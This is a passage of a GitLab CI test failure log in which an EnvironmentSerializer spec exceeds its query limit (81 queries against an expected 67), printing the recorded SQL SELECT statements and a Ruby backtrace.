/*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 218 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"status\" = 2 AND \"deployments\".\"environment_id\" = 397 AND \"deployments\".\"deployable_id\" = 263 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n     Shared Example Group: \"avoid N+1 on environments serialization\" called from ./ee/spec/serializers/ee/environment_serializer_spec.rb:17\n     # ./spec/support/shared_examples/serializers/environment_serializer_shared_examples.rb:11:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/spec_helper.rb:422:in `block (3 levels) in \u003ctop (required)\u003e'\n     # ./spec/support/sidekiq_middleware.rb:9:in `with_sidekiq_server_middleware'\n     # ./spec/spec_helper.rb:413:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/spec_helper.rb:409:in `block (3 levels) in \u003ctop (required)\u003e'\n     # ./lib/gitlab/application_context.rb:48:in `with_raw_context'\n     # ./spec/spec_helper.rb:409:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/spec_helper.rb:387:in `block (3 levels) in \u003ctop (required)\u003e'\n     # ./lib/gitlab/with_request_store.rb:17:in `enabling_request_store'\n     # ./lib/gitlab/with_request_store.rb:10:in `with_request_store'\n     # ./spec/spec_helper.rb:387:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/spec_helper.rb:267:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/support/system_exit_detected.rb:7:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/support/database/prevent_cross_joins.rb:106:in `block (3 levels) in \u003cmain\u003e'\n     # ./spec/support/database/prevent_cross_joins.rb:60:in `with_cross_joins_prevented'\n     # ./spec/support/database/prevent_cross_joins.rb:106:in `block (2 levels) in \u003cmain\u003e'\n\n  2) EE::EnvironmentSerializer behaves like avoid N+1 on environments serialization avoids N+1 database queries without grouping\n     Failure/Error: expect { serialize(grouping: false) }.not_to exceed_query_limit(control.count)\n\n       Expected a maximum of 67 queries, got 81:\n\n       SELECT COUNT(*) FROM (SELECT 1 AS one FROM \"environments\" WHERE \"environments\".\"project_id\" = 371 LIMIT 10001) subquery_for_count /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"environments\".* FROM \"environments\" WHERE \"environments\".\"project_id\" = 371 ORDER BY \"environments\".\"id\" ASC LIMIT 20 OFFSET 0 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"project_features\".* FROM \"project_features\" WHERE \"project_features\".\"project_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Project' AND \"routes\".\"source_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Namespace' AND \"routes\".\"source_id\" = 848 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"alert_management_alerts\".* FROM \"alert_management_alerts\" WHERE (\"alert_management_alerts\".\"status\" IN (0,1)) AND \"alert_management_alerts\".\"environment_id\" IN (398, 399, 400) ORDER BY \"alert_management_alerts\".\"severity\" ASC, \"alert_management_alerts\".\"started_at\" DESC /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"prometheus_alerts\".* FROM \"prometheus_alerts\" WHERE \"prometheus_alerts\".\"id\" IN (13, 12, 11) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"deployments\".* FROM ((SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 398 AND \"deployments\".\"status\" = 2 ORDER BY \"deployments\".\"finished_at\" DESC LIMIT 1) UNION (SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 399 AND \"deployments\".\"status\" = 2 ORDER BY \"deployments\".\"finished_at\" DESC LIMIT 1) UNION (SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 400 AND \"deployments\".\"status\" = 2 ORDER BY \"deployments\".\"finished_at\" DESC LIMIT 1)) deployments /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 478 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"id\" IN (267, 265, 269) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds_metadata\".\"project_id\", \"ci_builds_metadata\".\"timeout\", \"ci_builds_metadata\".\"timeout_source\", \"ci_builds_metadata\".\"interruptible\", \"ci_builds_metadata\".\"config_options\", \"ci_builds_metadata\".\"config_variables\", \"ci_builds_metadata\".\"has_exposed_artifacts\", \"ci_builds_metadata\".\"environment_auto_stop_in\", \"ci_builds_metadata\".\"expanded_environment_name\", \"ci_builds_metadata\".\"secrets\", \"ci_builds_metadata\".\"build_id\", \"ci_builds_metadata\".\"id\", \"ci_builds_metadata\".\"runtime_runner_features\" FROM \"ci_builds_metadata\" WHERE \"ci_builds_metadata\".\"build_id\" IN (265, 267, 269) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (220, 222, 224) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'manual' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'manual') AND \"ci_builds\".\"commit_id\" IN (220, 222, 224) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'delayed' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'scheduled') AND \"ci_builds\".\"commit_id\" IN (220, 222, 224) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"project_features\".* FROM \"project_features\" WHERE \"project_features\".\"project_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Project' AND \"routes\".\"source_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Namespace' AND \"routes\".\"source_id\" = 848 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"deployment_approvals\".* FROM \"deployment_approvals\" WHERE \"deployment_approvals\".\"deployment_id\" IN (218, 216, 220) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"deployments\".* FROM ((SELECT DISTINCT ON (environment_id) deployments.* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 398 AND \"deployments\".\"status\" IN (6, 1) ORDER BY environment_id, deployments.id DESC LIMIT 1) UNION (SELECT DISTINCT ON (environment_id) deployments.* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 399 AND \"deployments\".\"status\" IN (6, 1) ORDER BY environment_id, deployments.id DESC LIMIT 1) UNION (SELECT DISTINCT ON (environment_id) deployments.* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 400 AND \"deployments\".\"status\" IN (6, 1) ORDER BY environment_id, deployments.id DESC LIMIT 1)) deployments /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 478 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"id\" IN (268, 266, 270) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds_metadata\".\"project_id\", \"ci_builds_metadata\".\"timeout\", \"ci_builds_metadata\".\"timeout_source\", \"ci_builds_metadata\".\"interruptible\", \"ci_builds_metadata\".\"config_options\", \"ci_builds_metadata\".\"config_variables\", \"ci_builds_metadata\".\"has_exposed_artifacts\", \"ci_builds_metadata\".\"environment_auto_stop_in\", \"ci_builds_metadata\".\"expanded_environment_name\", \"ci_builds_metadata\".\"secrets\", \"ci_builds_metadata\".\"build_id\", \"ci_builds_metadata\".\"id\", \"ci_builds_metadata\".\"runtime_runner_features\" FROM \"ci_builds_metadata\" WHERE \"ci_builds_metadata\".\"build_id\" IN (266, 268, 270) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (221, 223, 225) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'manual' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'manual') AND \"ci_builds\".\"commit_id\" IN (221, 223, 225) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'delayed' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'scheduled') AND \"ci_builds\".\"commit_id\" IN (221, 223, 225) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", 